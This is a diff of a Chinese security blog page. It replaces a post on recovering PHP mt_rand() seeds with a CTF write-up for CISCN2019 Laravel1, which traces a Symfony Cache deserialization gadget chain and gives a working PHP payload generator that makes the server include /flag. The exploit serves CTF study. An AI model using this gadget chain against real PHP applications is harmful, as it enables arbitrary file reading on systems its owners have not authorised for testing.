@@ -9,14 +9,14 @@
   <meta name="keywords" content="">
   <meta name="description" content="">
   <meta name="author" content="kveln">
-  <title>无需爆破还原mt_rand()种子 | 过客</title>
+  <title>[CISCN2019 总决赛 Day1 Web4]Laravel1(反序列化) | 过客</title>
   <link href="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet">
   <!-- <link href="https://guokeya.github.io/media/css/bootstrap.min.css" rel="stylesheet"> -->
   <!--  <link href="https://guokeya.github.io/media/css/all.min.css" rel="stylesheet" type="text/css"> -->
   <link href="https://cdn.bootcss.com/font-awesome/5.11.2/css/all.min.css" rel="stylesheet">
   <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
   <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
-  <link rel="alternate" type="application/rss+xml" title="无需爆破还原mt_rand()种子 | 过客 » Feed" href="https://guokeya.github.io/atom.xml">
+  <link rel="alternate" type="application/rss+xml" title="[CISCN2019 总决赛 Day1 Web4]Laravel1(反序列化) | 过客 » Feed" href="https://guokeya.github.io/atom.xml">
   <link rel="stylesheet"href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/styles/androidstudio.min.css">
   <link href="https://guokeya.github.io/styles/main.css" rel="stylesheet">
   <script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
@@ -25,8 +25,8 @@
   <script>hljs.initHighlightingOnLoad();</script>
   
 
-    <meta property="og:description" content="无需爆破还原mt_rand()种子"/>
-    <meta property="og:url" content="https://guokeya.github.io/post/wu-xu-bao-po-huan-yuan-mt_randchong-zi/"/>
+    <meta property="og:description" content="[CISCN2019 总决赛 Day1 Web4]Laravel1(反序列化)"/>
+    <meta property="og:url" content="https://guokeya.github.io/post/iG-_evz93/"/>
     <meta property="og:locale" content="zh-CN"/>
     <meta property="og:type" content="website"/>
     <meta property="og:site_name" content="过客"/>
@@ -85,10 +85,10 @@
             <a href="https://guokeya.github.io/tag/Web/" class="tag">Web安全</a>
             
         </span>
-            <h1>无需爆破还原mt_rand()种子</h1>
+            <h1>[CISCN2019 总决赛 Day1 Web4]Laravel1(反序列化)</h1>
             <span class="meta">
             	Posted on
-              2020-02-09，1 min read
+              2020-04-04，2 min read
             </span>
           </div>
         </div>
@@ -101,34 +101,79 @@
     <div class="container">
       <div class="row">
         <div class="col-lg-8 col-md-10 mx-auto">
-          <p>详情看文章：https://www.anquanke.com/post/id/196831#h2-6<br>
-对于这个原理。还是懵懵的。</p>
+          <p>u1s1。BUU一分题太顶了</p>
+<p>这题。看了好久WP的情况下才复现。。。<br>
+涉及类的知识有点多。命名空间。继承。接口。啥的</p>
 <!-- more -->
-<p>大概就是已知第N个随机数和第N+226个随机数。那么就能求出种子</p>
+<p>首先source.tar.gz得到源码<br>
+既然是反序列化。首先搜<code>_destruct()</code>去找一个反序列化的点。<br>
+找到<code>vendor\symfony\symfony\src\Symfony\Component\Cache\Adapter\TagAwareAdapter.php</code></p>
+<p>这个类中的<code>__destruct</code>方法会调用<code>$this-&gt;commit()</code><br>
+而<code>$this-&gt;commit()</code>又会调用<code>$this-&gt;invalidateTags([])</code><br>
+进入invalidateTags方法中。</p>
+<pre><code>        if ($this-&gt;deferred) {
+            #判断$this-&gt;deferred是否存在
+            $items = $this-&gt;deferred;
+            foreach ($items as $key =&gt; $item) {
+                #将$this-&gt;deferred。键 值分离
+                if (!$this-&gt;pool-&gt;saveDeferred($item)) {
+                    #调用$this-&gt;pool-saveDeferred($item)
+                    unset($this-&gt;deferred[$key]);
+                    $ok = false;
+                }
+            }
+
+            $f = $this-&gt;getTagsByKey;
+            $tagsByKey = $f($items);
+            $this-&gt;deferred = [];
+        }
+</code></pre>
+<p>在这里<code>$this-&gt;pool</code>是可控的。也就是说。我们需要找一个类中有saveDeferred方法的类<br>
+去看<code>__construct</code>方法中<code>$this-&gt;pool</code>得是AdapterInterface接口的<br>
+那么现在我们得找一个Adapterinterface接口并且存在saveDferred方法的类<br>
+<img src="https://guokeya.github.io/post-images/1585988351979.png" alt="" loading="lazy"><br>
+进入这个类。<br>
+<img src="https://guokeya.github.io/post-images/1585988441572.png" alt="" loading="lazy"><br>
+全局搜CacheItemInterface接口<br>
+<img src="https://guokeya.github.io/post-images/1585988539016.png" alt="" loading="lazy"><br>
+条件都满足了。继续往下走<br>
+它会执行<code>$this-&gt;initialize()</code>方法<br>
+他会incluce。一个文件。那么我们可以盲猜/flag。<br>
+<img src="https://guokeya.github.io/post-images/1585988659430.png" alt="" loading="lazy"></p>
+<p>POP链就是这样。在构造payload的时候。还得注意各个类的命名空间</p>
 <pre><code>&lt;?php
-mt_srand(6758);
-for($i=0;$i&lt;228;$i++){
-	echo mt_rand().&quot; &quot;;
+namespace Symfony\Component\Cache{
+    final class CacheItem{
+    }
+}
+
+namespace Symfony\Component\Cache\Adapter{
+    use Symfony\Component\Cache\CacheItem;
+    class PhpArrayAdapter{
+        private $file='/flag';
+    }
+    class TagAwareAdapter{
+        private $deferred;
+        private $pool;
+        public function __construct(){
+            $this-&gt;deferred = array('xxx' =&gt; new CacheItem());
+            $this-&gt;pool = new PhpArrayAdapter();
+        }
+    }
+$a=new TagAwareAdapter();
+echo urlencode(serialize($a));
 }
 ?&gt;
+#这两个类都是在Symfony\Component\Cache\Adapter命名空间下的
+#而Cacheitem类则不在同一个类下。所以我们得新建一个命名空间。并且use导入
 </code></pre>
-<p>生成228个随机数<br>
-<img src="https://guokeya.github.io/post-images/1581221139511.png" alt="" loading="lazy"><br>
-1898764065是第0个<br>
-655275142是第227个<br>
-中间间隔226个<br>
-利用脚本：https://github.com/ambionics/mt_rand-reverse<br>
-第一个参数：第N个随机数<br>
-第二个参数：第N+226个随机数<br>
-第三个参数：第N个随机数。N的值<br>
-第四个参数：0代表PHP5。1代表PHP7+<br>
-<img src="https://guokeya.github.io/post-images/1581221240565.png" alt="" loading="lazy"></p>
+<figure data-type="image" tabindex="1"><img src="https://guokeya.github.io/post-images/1585989477015.png" alt="" loading="lazy"></figure>
 
           
           <p class="next-post">下一篇：
-            <a href="https://guokeya.github.io/post/vulnhubdc-456-ba-ji/">
+            <a href="https://guokeya.github.io/post/M776tFt3/">
               <span class="post-title">
-                 [vulnhub]DC-4/5/6靶机&rarr;
+                [PWNHUB 公开赛 2018]傻 fufu 的工作日(上传差异绕过)&rarr;
               </span>
             </a>
           </p>
